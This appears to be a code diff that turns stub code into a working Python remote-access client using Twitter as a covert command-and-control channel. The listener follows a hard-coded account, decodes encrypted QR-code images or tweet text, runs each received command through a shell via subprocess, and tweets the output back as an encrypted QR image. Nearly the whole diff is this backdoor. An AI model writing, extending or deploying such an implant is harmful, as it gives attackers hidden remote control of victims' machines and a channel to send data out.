@@ -1,119 +1,119 @@
 import time
-import base64
 import tweepy
-import uuid
 import os
 import zlib
 import qrcode
 from pyzbar.pyzbar import decode
 from PIL import Image
-import secrets
-from Crypto.Cipher import AES
-import hashlib
-from Crypto import Random
+import base64
+from encryption import AESCipher, load_keys
+import pickle
+import json
+import subprocess
+import requests
+from io import BytesIO
+from api_keys import api_keys
 # we using QRs cause twitter character limit banter
 
-class AESCipher(object):
-
-    def __init__(self, key): 
-        self.bs = AES.block_size
-        self.key = key #256 bit for AES-256 with PKCS#7 padding
-
-    def encrypt(self, raw):
-        raw = self._pad(raw)
-        iv = Random.new().read(AES.block_size)
-        cipher = AES.new(self.key, AES.MODE_CBC, iv)
-        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
-
-    def decrypt(self, enc):
-        enc = base64.b64decode(enc)
-        iv = enc[:AES.block_size]
-        cipher = AES.new(self.key, AES.MODE_CBC, iv)
-        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
-
-    def _pad(self, s):
-        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
-
-    @staticmethod
-    def _unpad(s):
-        return s[:-ord(s[len(s)-1:])]
-
-def load_keys():
-    if not os.path.exists('id'):
-        client_id = uuid.uuid4().hex
-        with open('id','wb') as f:
-            f.write(client_id.encode())
-    else:
-        with open('id','rb') as f:
-            client_id = f.read().decode()
-
-    if not os.path.exists('key'):
-        key = hashlib.sha256(secrets.token_bytes(32)).digest()
-        with open('key','wb') as f:
-            f.write(key)
-    else:
-        with open('key','rb') as f:
-            key = f.read()
-    return (client_id, key)
-
-# def generate_qr(message):
-#     # encode to base_64 and generate_qr
-#     message = base64.b64encode(message.encode('utf-8'))
-#     qr = qrcode.make(message)
-#     qr.save('message.png')
-
-# def read_qr(img):
-#     message = decode(Image.open(img))[0].data.decode()
-#     return base64.b64decode(message).decode('utf-8')
-
-# def post_response(message):
-#     return 0
-
-# def read_message(tweet):
-#     # get image from tweet and read qr
-#     return 0
-
-# auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
-# auth.set_access_token(access_token, access_token_secret)
-
-# api = tweepy.API(auth)
-
-# def confirm_connection(api):
-#     # send tweet confirming connection
-#     # client_id::command_in_b64::confirm
-#     # client_id::command_in_b64::response
-#     api.update_status(f'{client_id}::::Client_Confirmed::::confirm')
-#     return True
+# create listener
+class ClientListener(tweepy.StreamListener):
+    def __init__(self, client_id, api, cipher_key):
+        self.client_id = client_id
+        self.api = api
+        self.cipher = AESCipher(cipher_key)
+        self.connection_confirm()
 
 
-# def tweet_type(tweet):
-#     message = read_message(tweet)
-#     return tweet.split('::::')[-1]
+    def on_data(self, raw_data):
+        # process raw stream data, read qr, pipe message
+        self.process_raw(raw_data)
+        return True
 
-# def tweet_client(tweet):
-#     # still waiting for a twitter API key
-#     return 0
+    def process_raw(self, raw_data):
+        # do stuff here, raw_data is a string
+        data = json.loads(raw_data)
+        tweet = self.read_message(data)
 
-# # create listener
-# class ClientListener(tweepy.StreamListener):
+        if self.client_id in tweet and self._tweet_type(tweet) == 'connection_confirm':
+            pass
 
-#     def on_data(self, raw_data):
-#         # process raw stream data, read qr, pipe message
-#         self.process_raw(raw_data)
-#         return True
+        if self.client_id in tweet and self._tweet_type(tweet) == 'command':
+            # this is a command
+            command = tweet.split('::::')[1]
+            response = self._execute_command(command)
+            self.post_response(f'{response}')
 
-#     def process_raw(self, raw_data):
-#         # do shit here
-#         pass
+    def on_error(self, status_code):
+        if status_code == 420:
+            return False
+#-------------------------------------------------------Private subs-------------------------------------------------------#
+    # private sub for command execution
+    def _execute_command(self, command):
+        if command[:2] == 'cd':
+            os.chdir(command[3:])
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        response = str(output_bytes, "utf-8") + str(os.getcwd()) + '> '
+        return response
 
-#     def on_error(self, status_code):
-#         if status_code == 420:
-#             return False
+    def _tweet_type(self, tweet):
+        if tweet.split('::::'):
+            return tweet.split('::::')[-1]
+        return 'empty'
 
-# # create stream
-# class ShellStream():
-#     def __init__(self, auth, listener):
-#         self.stream = tweepy.Stream(auth=auth, listener=listener)
+#-------------------------------------------------------Public subs-------------------------------------------------------#
+    def generate_qr(self, message):
+        # encode to base_64 and generate_qr
+        message = self.cipher.encrypt(message)
+        message = base64.b64encode(message.encode('utf-8'))
+        qr = qrcode.make(message)
+        return qr
 
-#     def start(self, user_id):
-#         self.stream.filter(track = [user_id])
+    def read_qr(self, img):
+        message = decode(img)[0].data.decode()
+        message = base64.b64decode(message).decode('utf-8')
+        return self.cipher.decrypt(message)
+
+    def post_response(self, message):
+        # need encryption here but later problem
+        qr = self.generate_qr(message)
+        qr.save('response.jpg')
+        # post to twitter
+        self.api.update_with_media('response.jpg')
+        os.remove('response.jpg')
+        return True
+
+    def read_message(self, tweet_data):
+        if 'media' in tweet_data['entities']:
+            if 'media_url_https' in tweet_data['entities']['media'][0]:
+                # get image
+                response = requests.get(tweet_data['entities']['media'][0]['media_url_https'])
+                img = Image.open(BytesIO(response.content))
+                message = self.read_qr(img)
+                return message
+        else:
+            return tweet_data['text']
+
+    def connection_confirm(self):
+        message = f'{self.client_id}::::connection_confirm'
+        self.post_response(message)
+        return True
+
+# create stream
+class ShellStream():
+    def __init__(self, auth, listener):
+        self.stream = tweepy.Stream(auth=auth, listener=listener)
+
+    def start(self, user_id):
+        self.stream.filter(follow = [user_id])
+
+
+if __name__ == '__main__':
+    client_id, aeskey = load_keys()
+
+    auth = tweepy.OAuthHandler(api_keys['consumer_key'], api_keys['consumer_secret'])
+    auth.set_access_token(api_keys['access_token'], api_keys['access_token_secret'])
+    api = tweepy.API(auth)
+
+    stream = ShellStream(auth = auth, listener=ClientListener(client_id, api, aeskey))
+    stream.start('1239374094')
